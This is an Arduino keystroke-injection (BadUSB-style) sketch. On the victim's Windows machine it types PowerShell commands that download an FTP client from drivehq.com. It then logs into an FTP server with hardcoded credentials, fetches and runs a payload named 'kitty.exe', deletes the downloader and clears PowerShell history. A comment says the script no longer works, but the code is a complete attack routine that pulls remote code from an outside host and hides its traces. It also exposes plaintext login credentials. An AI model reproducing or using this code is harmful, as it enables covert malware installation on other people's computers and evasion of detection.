#include <Keyboard.h>
/*
 * 
 * 
 * 
 * 
 * 
 * THIS SCRIPT DIDN'T WORK NOW
 * 
 * 
 * 
 * 
 * 
 * 
 * 
*/
void ftp_pass() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(1000);
  changelanguage();
  //////////////////////Prepare to  download file//////////////////////////////////////////////////////////////////////////////////////////////////
  Keyboard.print("powershell");
  delay(1000);
  enter(1000);
  changelanguage();
  Keyboard.print("$WebClient = ");
  delay(200);
  Keyboard.print("New-Object ");
  delay(100);
  Keyboard.print("System.Net.");
  delay(100);
  Keyboard.print("Webclient");
  delay(1000);
  enter(1000);
  /////////////////////////////////////////////Start download file//////////////////////////////////////////////////////////////
  Keyboard.print("$WebClient.DownloadFile(");
  delay(100);
  Keyboard.write('"');
  delay(50);
  Keyboard.print("https://www.drivehq.com/file");
  delay(50);
  Keyboard.print("/df.aspx/publish/drivehq/DriveHQSoftware");
  delay(50);
  Keyboard.print("/cmdFTP.exe");
  delay(50);
  Keyboard.write('"');
  delay(50);
  Keyboard.print(",");
  delay(50);
  Keyboard.write('"');
  delay(50);
  Keyboard.print("$home/cmdftp.exe");
  delay(50);
  Keyboard.write('"');
  delay(50);
  Keyboard.print(")");
  delay(1000);
  enter(7000);
  ///////////////////////////End download file/////////////////////////////////////////////////////////////////////////////////////
  ///////////////////////////Start download payload////////////////////////////////////////////////////////////////////////////////
  Keyboard.print("start cmdftp.exe;exit");
  delay(2000);
  enter(1000);
  changelanguage();
  Keyboard.print("open ftp.drivehq.com");
  delay(1000);
  enter(1000);
  Keyboard.print("QwErTy1346792580");
  delay(1000);
  enter(1000);
  Keyboard.print("1346792580rowfoxnut");
  delay(600);
  enter(1000);
  Keyboard.print("get kitty.exe");
  delay(400);
  enter(3000);
  Keyboard.print("bye");
  delay(400);
  enter(500);
  delay(500);
  //////////////////////////////End download payload//////////////////////////////////////////////////////////////////////////////
  guir(400);
  changelanguage();
  Keyboard.print("powershell");
  delay(400);
  enter(800);
  changelanguage();
  delay(200);
  Keyboard.print("start kitty.exe ; rm ");
  delay(300);
  Keyboard.print("cmdftp.exe ; exit");
  delay(200);
  enter(1000);
  delay(5000);
  enter(1000);
  enter(200);
  /////////////////////////////Start cleaning unnessesary files////////////////////////////////////////////////////////////////////
  /*Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(300);
  changelanguage();
  delay(600);
  Keyboard.print("powershell");
  delay(300);
  enter(400);
  delay(1000);
  changelanguage();
  Keyboard.print("rm cmdftp.exe; exit");
  delay(300);
  enter(400);
  */
  //////////////////////////All unnesessary files was cleared//////////////////////////////////////////////////////////////////////
  //////////////////////////////Start cleaning history/////////////////////////////////////////////////////////////////////////////
  guir(400);
  changelanguage();
  clearpowershellhistory();
  //////////////////////////////History cleared////////////////////////////////////////////////////////////////////////////////////
  Keyboard.end();
} 
